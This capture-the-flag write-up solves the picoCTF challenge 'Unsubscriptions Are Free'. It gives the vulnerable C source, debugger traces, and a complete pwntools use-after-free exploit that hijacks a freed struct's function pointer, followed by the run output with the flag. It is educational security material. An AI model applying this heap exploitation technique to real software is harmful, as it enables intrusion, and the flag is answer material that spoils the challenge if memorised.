# Unsubscriptions Are Free
Category: Binary Exploitation, 100 points

## Description

> Check out my new video-game and spaghetti-eating streaming channel on Twixer! 

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
	puts("Account created.");
}

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}

```

A binary file was attached.

## Solution

This program is a Twitter-clone with some tweet-related functionality.

Reviewing the code, we can see a few things. First, we notice that the program leaks the address of `hahaexploitgobrrr` - the function that prints the flag. So we can be sure that we'll want to call it somehow.

We can also see that `user` is allocated on the heap, and that we can free `user` by calling `i()`. Furthermore, due to `main()`'s implementation, we can still dereference `user` even after calling `i()` to free it.

The attack is a simple heap exploit. We'll walk through an example using the debugger.

Let's start by checking the heap address that's assigned to `user` during `main`'s initialization:

```
$eax   : 0x0804c1a0  →  0x00000000
$ebx   : 0x0804b000  →  0x0804af0c  →  0x00000001
$ecx   : 0x0
$edx   : 0x4
$esp   : 0xffffd990  →  0x00000004
$ebp   : 0xffffd9a8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001e4d6c
$edi   : 0xf7fb5000  →  0x001e4d6c
$eip   : 0x08048d6f  →  <main+58> add esp, 0x10
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd990│+0x0000: 0x00000004   ← $esp
0xffffd994│+0x0004: 0x00000000
0xffffd998│+0x0008: 0xffffda6c  →  0xffffdbf4  →  "LANG=en_IL"
0xffffd99c│+0x000c: 0x08048d49  →  <main+20> add ebx, 0x22b7
0xffffd9a0│+0x0010: 0xffffd9c0  →  0x00000001
0xffffd9a4│+0x0014: 0x00000000
0xffffd9a8│+0x0018: 0x00000000   ← $ebp
0xffffd9ac│+0x001c: 0xf7deee46  →  <__libc_start_main+262> add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048d65 <main+48>        sub    esp, 0xc
    0x8048d68 <main+51>        push   0x4
    0x8048d6a <main+53>        call   0x8048620 <malloc@plt>
 →  0x8048d6f <main+58>        add    esp, 0x10
    0x8048d72 <main+61>        mov    edx, eax
    0x8048d74 <main+63>        mov    eax, 0x804b060
    0x8048d7a <main+69>        mov    DWORD PTR [eax], edx
    0x8048d7c <main+71>        call   0x8048b2d <printMenu>
    0x8048d81 <main+76>        call   0x8048bd5 <processInput>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8048d6f in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048d6f → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>
```

The address is saved in `eax`: `0x0804c1a0`.

Now, we'll add a breakpoint to `i` and request to free the `user` buffer:

```
$eax   : 0x0
$ebx   : 0x0804b000  →  0x0804af0c  →  0x00000001
$ecx   : 0x0804c010  →  0x00000001
$edx   : 0x0
$esp   : 0xffffd950  →  0x0804c1a0  →  0x00000000
$ebp   : 0xffffd978  →  0xffffd988  →  0xffffd9a8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001e4d6c
$edi   : 0xf7fb5000  →  0x001e4d6c
$eip   : 0x08048aff  →  <i+128> add esp, 0x10
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd950│+0x0000: 0x0804c1a0  →  0x00000000    ← $esp
0xffffd954│+0x0004: 0xffffd96b  →  0xc0ce0059 ("Y"?)
0xffffd958│+0x0008: 0xf7fb5000  →  0x001e4d6c
0xffffd95c│+0x000c: 0x08048a8b  →  <i+12> add ebx, 0x2575
0xffffd960│+0x0010: 0xffffd998  →  0xffffd9a8  →  0x00000000
0xffffd964│+0x0014: 0xf7fe9740  →   pop edx
0xffffd968│+0x0018: 0x5904b065
0xffffd96c│+0x001c: 0x15c0ce00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048af3 <i+116>          or     BYTE PTR [ebx+0xcec8300], cl
    0x8048af9 <i+122>          push   eax
    0x8048afa <i+123>          call   0x80485d0 <free@plt>
 →  0x8048aff <i+128>          add    esp, 0x10
    0x8048b02 <i+131>          jmp    0x8048b16 <i+151>
    0x8048b04 <i+133>          sub    esp, 0xc
    0x8048b07 <i+136>          lea    eax, [ebx-0x2078]
    0x8048b0d <i+142>          push   eax
    0x8048b0e <i+143>          call   0x8048630 <puts@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8048aff in i (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048aff → i()
[#1] 0x8048985 → doProcess()
[#2] 0x8048d97 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>  heap bins
─────────────────────────────────────────────────────────────────────────────────────── Tcachebins for arena 0xf7fb5740 ───────────────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=2, size=0x20] count=0  ←  Chunk(addr=0x804c1a0, size=0x10, flags=PREV_INUSE)
──────────────────────────────────────────────────────────────────────────────────────── Fastbins for arena 0xf7fb5740 ────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x18] 0x00
Fastbins[idx=2, size=0x20] 0x00
Fastbins[idx=3, size=0x28] 0x00
Fastbins[idx=4, size=0x30] 0x00
Fastbins[idx=5, size=0x38] 0x00
Fastbins[idx=6, size=0x40] 0x00
──────────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena '*0xf7fb5740' ────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────────────────────────────────────────────────────── Small Bins for arena '*0xf7fb5740' ─────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────────────────────────────────────── Large Bins for arena '*0xf7fb5740' ─────────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef>
```

Right after the `free` in `i()`, we can see that our `user` buffer was released and added to the `tcache` bin.

Now, we'll call `leaveMessage` to leave a message:

```
$eax   : 0x0804c1a0  →  0x00000000
$ebx   : 0x0804b000  →  0x0804af0c  →  0x00000001
$ecx   : 0x20
$edx   : 0x0
$esp   : 0xffffd960  →  0x00000008
$ebp   : 0xffffd988  →  0xffffd998  →  0xffffd9a8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001e4d6c
$edi   : 0xf7fb5000  →  0x001e4d6c
$eip   : 0x08048a61  →  <leaveMessage+64> add esp, 0x10
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd960│+0x0000: 0x00000008   ← $esp
0xffffd964│+0x0004: 0x08048f7f  →  0x00632520 ("%c"?)
0xffffd968│+0x0008: 0xffffd984  →  0x0804b000  →  0x0804af0c  →  0x00000001
0xffffd96c│+0x000c: 0x08048a2d  →  <leaveMessage+12> add ebx, 0x25d3
0xffffd970│+0x0010: 0xf7fb5000  →  0x001e4d6c
0xffffd974│+0x0014: 0xf7fb5000  →  0x001e4d6c
0xffffd978│+0x0018: 0xf7dfd0e5  →  <toupper+5> add ecx, 0x1b7f1b
0xffffd97c│+0x001c: 0x08048c15  →  <processInput+64> add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048a57 <leaveMessage+54> sub    esp, 0xc
    0x8048a5a <leaveMessage+57> push   0x8
    0x8048a5c <leaveMessage+59> call   0x8048620 <malloc@plt>
 →  0x8048a61 <leaveMessage+64> add    esp, 0x10
    0x8048a64 <leaveMessage+67> mov    DWORD PTR [ebp-0xc], eax
    0x8048a67 <leaveMessage+70> sub    esp, 0x4
    0x8048a6a <leaveMessage+73> push   0x8
    0x8048a6c <leaveMessage+75> push   DWORD PTR [ebp-0xc]
    0x8048a6f <leaveMessage+78> push   0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8048a61 in leaveMessage (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048a61 → leaveMessage()
[#1] 0x8048d07 → processInput()
[#2] 0x8048d86 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>
```

If we stop right after the `malloc`, we can see that our `0x0804c1a0` buffer has been re-allocated and it returns as the message buffer. This happens since the current allocation request is for 8 bytes, and we happen to have such a chunk waiting patiently in the Heap Manager's `tcache` for an opportunity just like this one: The one previously known as `user`. Therefore, instead of creating a new chunk, the Heap Manager chooses to save some overhead and return the chunk from the cache.
We even have the ability to write to it since the function calls `read` immediately after. But what should we write?

After returning from `leaveMessage` to `processInput` and back to the main loop, `doProcess(user)` will be called:

```c
void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```

So `doProcess` will dereference the pointer (which we now control as part of our message) and call the pointer at offset 0 (`"whatToDo"`). Therefore, we'd like to make sure that this memory location points to `hahaexploitgobrrr` in order to get our flag.

Putting it all together, we have the following exploit:

```python
# First, generate a template using:
#  pwn template --host mercury.picoctf.net --port 4593 ./vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

from enum import Enum

class Commands(Enum):
    SUBSCRIBE       = "S"
    DELETE_ACCOUNT  = "I"
    CREATE_ACCOUNT  = "M"
    PAY             = "P"
    LEAVE_MESSAGE   = "L"
    EXIT            = "E"

def send_command(command):
    io.recvuntil("(e)xit\n")
    io.sendline(command.value)

def subscribe():
    log.info("Subscribing")
    memleak_line = "OOP! Memory leak..."

    send_command(Commands.SUBSCRIBE)
    line = io.recvlineS()
    if line == "Not logged in!":
        return None
    elif memleak_line in line:
        addr = int(line.replace(memleak_line, "").strip(), 16)
        log.info("Leaked address: {}".format(hex(addr)))
        io.recvline()
        return addr
    else:
        raise RuntimeError(f"Unexpected output during subscription: {line}")

def delete_account():
    log.info("Deleting account")

    send_command(Commands.DELETE_ACCOUNT)
    io.sendlineafter("You're leaving already(Y/N)?\n", "Y")
    io.recvline()

def leave_message(msg):
    log.info("Leaving message:\n{}".format(hexdump(msg)))
    send_command(Commands.LEAVE_MESSAGE)
    io.sendlineafter("try anyways:\n", msg)

def exit():
    log.info("Exiting")
    send_command(Commands.EXIT)

io = start()

hahaexploitgobrrr_addr = subscribe()
delete_account()
payload = p32(hahaexploitgobrrr_addr) + p32(0)
leave_message(payload)
log.success(io.recvlineS())
exit()
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Unsubscriptions_Are_Free]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/pico/Unsubscriptions_Are_Free/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to mercury.picoctf.net on port 4593: Done
[*] Subscribing
[*] Leaked address: 0x80487d6
[*] Deleting account
[*] Leaving message:
    00000000  d6 87 04 08  00 00 00 00                            │····│····│
    00000008
[+] picoCTF{d0ubl3_j30p4rdy_ba307b82}
[*] Exiting
```

